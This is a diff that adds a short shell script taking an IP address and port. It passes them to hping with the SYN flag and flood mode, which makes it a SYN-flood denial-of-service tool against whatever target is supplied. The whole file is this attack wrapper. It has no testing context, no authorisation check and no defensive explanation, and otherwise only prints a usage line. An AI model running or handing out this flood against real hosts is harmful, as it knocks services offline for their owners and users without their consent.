@@ -1,0 +1,7 @@
+#!/bin/sh
+
+if [ $#  == 2 ]; then
+    hping -S  -p $2  --flood $1
+else
+    echo $0 IP PORT
+fi
